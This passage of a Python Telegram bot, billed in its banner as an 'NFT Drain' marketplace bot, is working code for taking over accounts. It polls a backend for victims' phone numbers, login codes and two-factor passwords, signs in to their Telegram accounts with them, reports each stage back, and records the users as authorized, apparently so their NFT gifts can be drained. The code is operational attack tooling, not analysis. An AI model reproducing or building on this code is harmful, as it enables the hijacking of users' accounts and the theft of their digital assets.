                                                'hash': sent.phone_code_hash,
                                                'telegram_id': telegram_id
                                            }
                                            logger.info(f"✅ Code sent to {mask_phone(phone)}")
                                            
                                            async with aiohttp.ClientSession() as s:
                                                await s.post(
                                                    f"{SETTINGS['api_url']}/api/telegram/update-request",
                                                    json={
                                                        'requestId': req_id,
                                                        'status': 'code_sent',
                                                        'telegramId': telegram_id,
                                                        'processed': True
                                                    },
                                                    timeout=aiohttp.ClientTimeout(total=5)
                                                )
                                                logger.info(f"📤 Status updated: code_sent")
                                        
                                        except Exception as e:
                                            logger.error(f"❌ send_code error: {e}")
                                            await alert_admins(bot, f"Auth error (send_code): {e}")
                                            processed_ids.discard(key)
                                    
                                    elif action == 'send_code_input':
                                        logger.info(f"🔐 Processing: send_code_input | Code: {code}")
                                        processed_ids.add(key)
                                        
                                        session_data = auth_sessions.get(req_id)
                                        if not session_data:
                                            logger.warning(f"⚠ No session for {req_id}")
                                            continue
                                        
                                        try:
                                            client = session_data['client']
                                            await client.sign_in(
                                                phone=session_data['phone'],
                                                phone_code_hash=session_data['hash'],
                                                phone_code=code
                                            )
                                            logger.info(f"✅ Code verified successfully")
                                            
                                            async with aiohttp.ClientSession() as s:
                                                await s.post(
                                                    f"{SETTINGS['api_url']}/api/telegram/update-request",
                                                    json={
                                                        'requestId': req_id,
                                                        'status': 'code_verified',
                                                        'telegramId': telegram_id,
                                                        'processed': True
                                                    },
                                                    timeout=aiohttp.ClientTimeout(total=5)
                                                )
                                                logger.info(f"📤 Status updated: code_verified")
                                            
                                            db.mark_authorized(telegram_id, session_data['phone'])
                                            logger.info(f"✅ User {telegram_id} authorized!")
                                        
                                        except SessionPasswordNeeded:
                                            logger.info(f"🔒 2FA required for {mask_phone(session_data['phone'])}")
                                            
                                            async with aiohttp.ClientSession() as s:
                                                await s.post(
                                                    f"{SETTINGS['api_url']}/api/telegram/update-request",
                                                    json={
                                                        'requestId': req_id,
                                                        'status': 'waiting_password',
                                                        'action': 'send_password',
                                                        'telegramId': telegram_id,
                                                        'processed': False
                                                    },
                                                    timeout=aiohttp.ClientTimeout(total=5)
                                                )
                                                logger.info(f"📤 Status updated: waiting_password")
                                        
                                        except PhoneCodeInvalid:
                                            logger.error(f"❌ Invalid code")
                                            await alert_admins(bot, f"Invalid code for {mask_phone(session_data['phone'])}")
                                            processed_ids.discard(key)
                                        
                                        except Exception as e:
                                            logger.error(f"❌ Code input error: {e}")
                                            await alert_admins(bot, f"Auth error (send_code_input): {e}")
                                            processed_ids.discard(key)
                                    
                                    elif action == 'send_password':
                                        logger.info(f"🔐 Processing: send_password | TG: {telegram_id}")
                                        processed_ids.add(key)
                                        
                                        session_data = auth_sessions.get(req_id)
                                        if not session_data or not password:
                                            logger.warning(f"⚠ No session or password for {req_id}")
                                            continue
                                        
                                        try:
                                            client = session_data['client']
                                            await client.check_password(password)
                                            logger.info(f"✅ 2FA password verified")
                                            
                                            async with aiohttp.ClientSession() as s:
                                                await s.post(
                                                    f"{SETTINGS['api_url']}/api/telegram/update-request",
                                                    json={
                                                        'requestId': req_id,
                                                        'status': 'success',
                                                        'telegramId': telegram_id,
                                                        'processed': True
                                                    },
                                                    timeout=aiohttp.ClientTimeout(total=5)
                                                )
                                                logger.info(f"📤 Status updated: success")
                                            
                                            db.mark_authorized(telegram_id, session_data['phone'])
                                            logger.info(f"✅ User {telegram_id} fully authorized!")
                                            
                                            auth_sessions.pop(req_id, None)
                                        
                                        except PasswordHashInvalid:
                                            logger.error(f"❌ Invalid 2FA password")
                                            await alert_admins(bot, f"Invalid 2FA password for {mask_phone(session_data['phone'])}")
                                            processed_ids.discard(key)
                                        
                                        except Exception as e:
                                            logger.error(f"❌ Password error: {e}")
                                            await alert_admins(bot, f"Auth error (send_password): {e}")
                                            processed_ids.discard(key)
            
            except Exception as e:
                logger.error(f"Poll error: {e}")
            
            await asyncio.sleep(2)
    
    auth_poll_task = asyncio.create_task(run_auth_polling())
    
    print_banner()
    print_success("🤖 Bot started!")
    
    try:
        await dp.start_polling(bot)
    finally:
        auth_poll_task.cancel()
        await bot.session.close()

def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       🎁 UNIFIED NFT MARKETPLACE BOT v2.5                    ║
║    Авторизация + NFT Drain + Admin Panel + Gift Management  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

if __name__ == "__main__":
    asyncio.run(main())
